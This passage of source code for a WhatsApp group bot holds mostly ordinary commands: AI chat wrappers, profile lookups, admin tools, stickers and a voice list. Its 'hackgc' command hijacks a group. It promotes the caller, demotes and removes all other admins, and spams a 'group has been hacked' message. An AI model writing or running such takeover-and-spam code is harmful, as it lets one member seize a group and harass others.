        let response = await axios.get(`https://api.siputzx.my.id/api/ai/gemini-pro?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'gemma': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/gemma?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'gita': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/gita?q=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'metai2': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'mistral': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/mistral-7b-instruct-v0.2?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'muslimai': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'powerbrain': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/powerbrainai?query=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'qwen2': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/qwen257b?prompt=you%20are%20a%20friendly%20ai&text=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'qvq': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/qwq-32b-preview?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'teachai': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/teachanything?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'venice': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/venice?prompt=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'copilot2trip': {
    if (!text) return replyphistar(`❌ Please provide a location.\n\nExample: ${prefix + command} Abuja Nigeria`);

    try {
        let response = await axios.get(`https://itzpire.com/ai/copilot2trip?q=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.result}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}
case 'tiktokstalk':
case 'ttstalk': {
    if (!args[0]) return replyphistar('Please provide a TikTok username!');

    const username = args[0];

    try {
        const response = await axios.get(`https://bk9.fun/stalk/tiktok?q=${username}`);

        // Check if the request was successful
        if (response.data.status === true) {
            const profile = response.data.BK9;

            // Format and send profile information with a thumbnail (profile picture)
            await PhistarBotInc.sendMessage(m?.chat, {
                image: { url: profile.profile },
                caption: `*[ TIKTOK PROFILE INFO ]*\n
- *🔖Name:* ${profile.name}
- *🔖Username:* ${profile.username}
- *👥Follower:* ${profile.followers}
- *🫂Following:* ${profile.following}
- *Likes:* ${profile.likes}
-  *📌Bio:* ${profile.bio || 'No bio available'}
- *🏝️Description:*: ${profile.desc || 'No description available'}`
            });

        } else {
            replyphistar('Could not retrieve the profile. Please make sure the username is correct!');
        }
    } catch (error) {
        console.error(error);
        replyphistar('There was an error fetching the TikTok profile information.');
    }
    break;
}
case 'demoteall': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replyphistar('Only group admins can use this command.');

    for (let admin of groupAdmins) {
        if (admin !== botNumber) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [admin], 'demote');
                await delay(500); // Add a 1-second delay between each request
            } catch (err) {
                console.log(`Error demoting ${admin}:`, err.message);
            }
        }
    }
    replyphistar('Successfully demoted all admins to members.');
    break;
}
case 'gpt4': 
case 'gpt3': 
case 'gptpro': {
    if (!text) {
        PhistarBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: m });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            PhistarBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: m }); // Send the AI's response
        } else {
            PhistarBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        PhistarBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: m });
    }
    break;
}
    case 'hackgc':
    if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
    try {
        const groupId = m.chat; // Current group ID
        const targetUser = m.sender; // The sender initiating the hack

        // Step 1: Simulate hacking progression
        const hackingSteps = [
            { percentage: 10, message: "Establishing secure connection..." },
            { percentage: 30, message: "Bypassing group security protocols..." },
            { percentage: 50, message: "Attempting to gain admin privileges..." },
            { percentage: 70, message: "Adding ghost (fake) contacts to the group..." },
            { percentage: 85, message: "Neutralizing existing admin accounts..." },
            { percentage: 100, message: "Finalizing hack and locking group access..." }
        ];

        for (const step of hackingSteps) {
            await replyphistar(
                `🛠️ *HACK IN PROGRESS*\n\n` +
                `Progress: *${step.percentage}%*\n` +
                `Action: ${step.message}\n\n` +
                `Loading... █${'█'.repeat(step.percentage / 10)}${'░'.repeat(10 - step.percentage / 10)}`
            );
            await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for effect
        }

        // Step 2: Make the user an admin
        await PhistarBotInc.groupParticipantsUpdate(groupId, [targetUser], 'promote')
            .then(() => {
                replyphistar(`✅ *SUCCESS!*\n\nYou are now an admin of this group.`);
            })
            .catch(err => {
                console.error("❌ Failed to promote user to admin:", err.message);
                return replyphistar("❌ *Hack Failed: Unable to gain admin privileges.*");
            });   
        // Step 4: Remove all other admins
        const groupMetadata = await PhistarBotInc.groupMetadata(groupId);
        const groupParticipants = groupMetadata.participants;
        const groupAdmins = groupParticipants.filter(p => p.admin).map(admin => admin.id);

        // Demote and remove all other admins except the target user
        for (const adminId of groupAdmins) {
            if (adminId !== targetUser) {
                await PhistarBotInc.groupParticipantsUpdate(groupId, [adminId], 'demote')
                    .then(() => console.log(`✅ Admin ${adminId} demoted successfully.`))
                    .catch(err => console.error(`❌ Failed to demote admin ${adminId}: ${err.message}`));

                await PhistarBotInc.groupParticipantsUpdate(groupId, [adminId], 'remove')
                    .then(() => console.log(`✅ Admin ${adminId} removed successfully.`))
                    .catch(err => console.error(`❌ Failed to remove admin ${adminId}: ${err.message}`));
            }
        }

        // Step 5: Spam the group with messages
        const spamMessage = "🔥 *This group has been hacked by BigDaddy V1!* 🔥\n\nSecurity compromised. Contact the owner to restore access.";
        for (let i = 0; i < 10; i++) { // Sends 10 spam messages
            await PhistarBotInc.sendMessage(groupId, { text: spamMessage })
                .then(() => console.log(`✅ Spam message ${i + 1} sent.`))
                .catch(err => console.error(`❌ Failed to send spam message ${i + 1}: ${err.message}`));
        }

        replyphistar(
            "✅ *HACK SUCCESSFUL!*\n\n" +
            "🎉 Group has been compromised successfully.\n" +
            "👤 Fake contacts added.\n" +
            "🔐 Admins removed.\n" +
            "💣 Group spammed with warning messages."
        );
    } catch (err) {
        replyphistar('❌ *ERROR: An unexpected error occurred during the hack process.*');
        console.error(err);
    }
    break;
            case 'promote': case 'admin': {
    if (!m.isGroup) return replyphistar('For Groups Only');
    if (!isAdmins && !isCreator) return replyphistar('Restricted to admins and creators');
    await PhistarBotInc.sendMessage(from, { react: { text: "🫡", key: m.key } });
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await replyphistar(`@${users.split('@')[0]} promoted successfully`);
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replyphistar(jsonformat(res))).catch((err) => replyphistar(jsonformat(err)));
    break;
}

case 'demote': case 'unadmin': {
    if (!m.isGroup) return replyphistar('For Groups Only');
    if (!isAdmins && !isCreator) return replyphistar('Restricted to admins and creators');
    await PhistarBotInc.sendMessage(from, { react: { text: "🫡", key: m.key } });
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await replyphistar(`@${users.split('@')[0]} demoted successfully`);
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replyphistar(jsonformat(res))).catch((err) => replyphistar(jsonformat(err)));
    break;
}
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateSubject(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateDescription(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!quoted) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PhistarBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                } else {
                    var memeg = await PhistarBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins && !isCreator) return replyphistar(mess.botAdmin)
                let teks = `*👥 You have Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                PhistarBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins && !isCreator) return replyphistar(mess.botAdmin)
                PhistarBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isBotAdmins && !isCreator) return replyphistar(mess.botAdmin)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!m.quoted) return replyphistar(`Reply messages with captions ${prefix + command}`)
                PhistarBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyphistar(`Success In Closing The Group 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyphistar(`Success In Opening The Group 🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyphistar(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyphistar(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                await PhistarBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyphistar(`BIG DADDY has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replyphistar(json(err)))
                break
// ping command
case 'ping': {
    // Prevent multiple execution in the same chat
    if (!global.executedCommands) global.executedCommands = new Set();
    
    const chatKey = `ping_${m.chat}`;
    if (global.executedCommands.has(chatKey)) return;
    global.executedCommands.add(chatKey);
    
    const startTime = performance.now();
    const latency = (performance.now() - startTime).toFixed(4);
    
    const response = `
╭─「 *PONG* 」─⬣
│
│  ⚡ *Response Speed:* ${latency} seconds
│
╰─「 *${global.phistar.name}* 」─⬣`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: global.phistar.channel.name,
                newsletterJid: global.phistar.channel.jid,
                serverMessageId: Math.floor(Date.now() / 1000)
            },
            externalAdReply: {
                title: "🏓 PONG!",
                body: `${latency}s response`,
                thumbnailUrl: global.phistar.thumbnail,
                sourceUrl: global.phistar.channel.link
            }
        }
    }, { quoted: m });
    
    // Remove from executed set after delay
    setTimeout(() => {
        global.executedCommands.delete(chatKey);
    }, 3000);
}
break;
// premium command
case 'buypremium':
case 'buyprem':
case 'premium': {
    const response = `
╭─「 *PREMIUM* 」─⬣
│
│  👋 Hey ${m.pushName}
│  💎 Want to Buy Premium?
│  📞 Just chat with Philip
│  👉 t.me/phistar1
│
╰─「 *${global.phistar.name}* 」─⬣`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: global.phistar.channel.name,
                newsletterJid: global.phistar.channel.jid,
                serverMessageId: Math.floor(Date.now() / 1000)
            },
            externalAdReply: {
                title: "💎 PREMIUM",
                body: "Upgrade your experience",
                thumbnailUrl: 'https://i.postimg.cc/x8QdyD1G/IMG-20250823-WA004.jpg',
                sourceUrl: "https://t.me/phistar1"
            }
        }
    }, { quoted: m });
}
break;

// script command
case 'sc':
case 'script':
case 'scriptbot': {
    const response = `
╭─「 *SCRIPT* 」─⬣
│
│  🤖 *Big Daddy V3* Script
│  💰 Price: $###
│  📞 DM: t.me/phistar1
│
╰─「 *${global.phistar.name}* 」─⬣`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: global.phistar.channel.name,
                newsletterJid: global.phistar.channel.jid,
                serverMessageId: Math.floor(Date.now() / 1000)
            },
            externalAdReply: {
                title: "🤖 BOT SCRIPT",
                body: "Get your own bot",
                thumbnailUrl: 'https://i.postimg.cc/x8QdyD1G/IMG-20250823-WA004.jpg',
                sourceUrl: "https://t.me/phistar1"
            }
        }
    }, { quoted: m });
}
break;
            case 'donate':
            case 'donasi':
                let textnate = `Hello Cutie💕 ${pushname}\n\nNo matter how much you donate is very valuable for us❤️`
                PhistarBotInc.sendMessage(m.chat, {
                    text: 'Palmpay 🏦 Acct No: 9128019141😊 Acct Name: Edward saliu/David Tomiwa\n\n' + textnate
                }, {
                    quoted: m
                })
                break
                case 'google':
    try {
        if (!text) {
            replyphistar("Please provide a query.\n*Example: .google What is a bot.*");
            break;
        }

        const axios = require('axios');
        const cheerio = require('cheerio'); // For scraping Google search results

        replyphistar("Searching Google...");

        const query = encodeURIComponent(text.trim());
        const url = `https://www.google.com/search?q=${query}`;

        // Fetch Google search results
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            },
        });

        // Parse results using Cheerio
        const $ = cheerio.load(data);
        const results = [];

        $(".tF2Cxc").each((index, element) => {
            const title = $(element).find(".DKV0Md").text();
            const link = $(element).find("a").attr("href");
            const snippet = $(element).find(".IsZvec").text();
            if (title && link) {
                results.push({ title, snippet, link });
            }
        });

        // Check if results exist
        if (results.length === 0) {
            replyphistar(`No results found for: "${text}".`);
            break;
        }

        // Format and send results
        let responseMessage = `*Google Search Results for:* ${text}\n\n`;
        results.slice(0, 5).forEach((result, index) => {
            responseMessage += `*${index + 1}. ${result.title}*\n`;
            responseMessage += `${result.snippet}\n`;
            responseMessage += `_Link:_ ${result.link}\n\n`;
            responseMessage += `────────────────────────\n\n`;
        });

        replyphistar(responseMessage);

    } catch (err) {
        replyphistar("An error occurred during Google search. Please try again.");
        console.error(err.message || err);
    }
    break;
    case 'riddle':
    try {
        // Select a random riddle
        const riddle = devinettes[Math.floor(Math.random() * devinettes.length)];

        // Send the riddle question
        await PhistarBotInc.sendMessage(m.chat, {
            text: `🤔 *Riddle:* ${riddle.question}\n\nYou have *30 seconds* to think!`
        }, { quoted: m });

        // Wait for 30 seconds
        await new Promise(resolve => setTimeout(resolve, 30000));

        // Send the riddle answer
        await PhistarBotInc.sendMessage(m.chat, {
            text: `⏱️ *Time's up!* The answer is: *${riddle.reponse}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error:", error.message || "An unexpected error occurred.");
        replyphistar("Oops, an error occurred while processing the riddle. Please try again later.");
    }
    break;
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyphistar(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyphistar(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
           
            case 'text2speech': {
    function ListVoiceArray(array) {
        const modifiedArray = array.map(item => {
            const modifiedName = item.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)");
            const language = item.split('-')[0];
            return `${modifiedName} ( ${language} )`;
        });
        return modifiedArray;
    }

    let ListVoice = [
        "af-ZA-AdriNeural",
        "af-ZA-WillemNeural",
        "am-ET-AmehaNeural",
        "am-ET-MekdesNeural",
        "ar-AE-FatimaNeural",
        "ar-AE-HamdanNeural",
        "ar-BH-AliNeural",
        "ar-BH-LailaNeural",
        "ar-DZ-AminaNeural",
        "ar-DZ-IsmaelNeural",
        "ar-EG-SalmaNeural",
        "ar-EG-ShakirNeural",
        "ar-IQ-BasselNeural",
        "ar-IQ-RanaNeural",
        "ar-JO-SanaNeural",
        "ar-JO-TaimNeural",
        "ar-KW-FahedNeural",
        "ar-KW-NouraNeural",
        "ar-LB-LaylaNeural",
        "ar-LB-RamiNeural",
        "ar-LY-ImanNeural",
        "ar-LY-OmarNeural",
        "ar-MA-JamalNeural",
        "ar-MA-MounaNeural",
        "ar-OM-AbdullahNeural",
        "ar-OM-AyshaNeural",
        "ar-QA-AmalNeural",
        "ar-QA-MoazNeural",
        "ar-SA-HamedNeural",
        "ar-SA-ZariyahNeural",
        "ar-SY-AmanyNeural",
        "ar-SY-LaithNeural",
        "ar-TN-HediNeural",
        "ar-TN-ReemNeural",
        "ar-YE-MaryamNeural",
        "ar-YE-SalehNeural",
        "az-AZ-BabekNeural",
        "az-AZ-BanuNeural",
        "bg-BG-BorislavNeural",
        "bg-BG-KalinaNeural",
        "bn-BD-NabanitaNeural",
        "bn-BD-PradeepNeural",
        "bn-IN-BashkarNeural",
        "bn-IN-TanishaaNeural",
        "bs-BA-GoranNeural",
        "bs-BA-VesnaNeural",
        "ca-ES-AlbaNeural",
        "ca-ES-EnricNeural",
        "ca-ES-JoanaNeural",
        "cs-CZ-AntoninNeural",
        "cs-CZ-VlastaNeural",
        "cy-GB-AledNeural",
        "cy-GB-NiaNeural",
        "da-DK-ChristelNeural",
        "da-DK-JeppeNeural",
        "de-AT-IngridNeural",
        "de-AT-JonasNeural",
        "de-CH-JanNeural",
        "de-CH-LeniNeural",
        "de-DE-AmalaNeural",
        "de-DE-BerndNeural",
        "de-DE-ChristophNeural",
        "de-DE-ConradNeural",
        "de-DE-ElkeNeural",
        "de-DE-GiselaNeural",
        "de-DE-KasperNeural",
        "de-DE-KatjaNeural",
        "de-DE-KillianNeural",
        "de-DE-KlarissaNeural",
        "de-DE-KlausNeural",
        "de-DE-LouisaNeural",
        "de-DE-MajaNeural",
        "de-DE-RalfNeural",
        "de-DE-TanjaNeural",
        "el-GR-AthinaNeural",
        "el-GR-NestorasNeural",
        "en-AU-AnnetteNeural",
        "en-AU-CarlyNeural",
        "en-AU-DarrenNeural",
        "en-AU-DuncanNeural",
        "en-AU-ElsieNeural",
        "en-AU-FreyaNeural",
        "en-AU-JoanneNeural",
        "en-AU-KenNeural",
        "en-AU-KimNeural",
        "en-AU-NatashaNeural",
        "en-AU-NeilNeural",
        "en-AU-TimNeural",
        "en-AU-TinaNeural",
        "en-AU-WilliamNeural",
        "en-CA-ClaraNeural",
        "en-CA-LiamNeural",
        "en-GB-AbbiNeural",
        "en-GB-AlfieNeural",
        "en-GB-BellaNeural",
        "en-GB-ElliotNeural",
        "en-GB-EthanNeural",
        "en-GB-HollieNeural",
        "en-GB-LibbyNeural",
        "en-GB-MaisieNeural",
        "en-GB-MiaNeural",
        "en-GB-NoahNeural",
        "en-GB-OliverNeural",
        "en-GB-OliviaNeural",
        "en-GB-RyanNeural",
        "en-GB-SoniaNeural",
        "en-GB-ThomasNeural",
        "en-HK-SamNeural",
        "en-HK-YanNeural",
        "en-IE-ConnorNeural",
        "en-IE-EmilyNeural",
        "en-IN-NeerjaNeural",
        "en-IN-PrabhatNeural",
        "en-KE-AsiliaNeural",
        "en-KE-ChilembaNeural",
        "en-NG-AbeoNeural",
        "en-NG-EzinneNeural",
        "en-NZ-MitchellNeural",
        "en-NZ-MollyNeural",
        "en-PH-JamesNeural",
        "en-PH-RosaNeural",
        "en-SG-LunaNeural",
        "en-SG-WayneNeural",
        "en-TZ-ElimuNeural",
        "en-TZ-ImaniNeural",
        "en-US-AIGenerate1Neural",
        "en-US-AIGenerate2Neural",
        "en-US-AmberNeural",
        "en-US-AnaNeural",
        "en-US-AriaNeural",
        "en-US-AshleyNeural",
        "en-US-BlueNeural",
        "en-US-BrandonNeural",
        "en-US-ChristopherNeural",
        "en-US-CoraNeural",
        "en-US-DavisNeural",
        "en-US-ElizabethNeural",
        "en-US-EricNeural",
        "en-US-GuyNeural",
        "en-US-JacobNeural",
        "en-US-JaneNeural",
        "en-US-JasonNeural",
        "en-US-JennyMultilingualNeural",
        "en-US-JennyMultilingualV2Neural",
        "en-US-JennyNeural",
        "en-US-MichelleNeural",
        "en-US-MonicaNeural",
        "en-US-NancyNeural",
        "en-US-RogerNeural",
        "en-US-RyanMultilingualNeural",
        "en-US-SaraNeural",
        "en-US-SteffanNeural",
        "en-US-TonyNeural",
        "en-ZA-LeahNeural",
        "en-ZA-LukeNeural",
        "es-AR-ElenaNeural",
        "es-AR-TomasNeural",
        "es-BO-MarceloNeural",
        "es-BO-SofiaNeural",
        "es-CL-CatalinaNeural",
        "es-CL-LorenzoNeural",
        "es-CO-GonzaloNeural",
        "es-CO-SalomeNeural",
        "es-CR-JuanNeural",
        "es-CR-MariaNeural",
        "es-CU-BelkysNeural",
        "es-CU-ManuelNeural",
        "es-DO-EmilioNeural",
        "es-DO-RamonaNeural",
        "es-EC-AndreaNeural",
        "es-EC-LuisNeural",
        "es-ES-AbrilNeural",
        "es-ES-AlvaroNeural",
        "es-ES-ArnauNeural",
        "es-ES-DarioNeural",
        "es-ES-EliasNeural",
        "es-ES-ElviraNeural",
        "es-ES-EstrellaNeural",
        "es-ES-IreneNeural",
        "es-ES-LaiaNeural",
        "es-ES-LiaNeural",
        "es-ES-NilNeural",
        "es-ES-SaulNeural",
        "es-ES-TeoNeural",
        "es-ES-TrianaNeural",
        "es-ES-VeraNeural",
        "es-GQ-JavierNeural",
        "es-GQ-TeresaNeural",
        "es-GT-AndresNeural",
        "es-GT-MartaNeural",
        "es-HN-CarlosNeural",
        "es-HN-KarlaNeural",
        "es-MX-BeatrizNeural",
        "es-MX-CandelaNeural",
        "es-MX-CarlotaNeural",
        "es-MX-CecilioNeural",
        "es-MX-DaliaNeural",
        "es-MX-GerardoNeural",
        "es-MX-JorgeNeural",
        "es-MX-LarissaNeural",
        "es-MX-LibertoNeural",
        "es-MX-LucianoNeural",
        "es-MX-MarinaNeural",
        "es-MX-NuriaNeural",
        "es-MX-PelayoNeural",
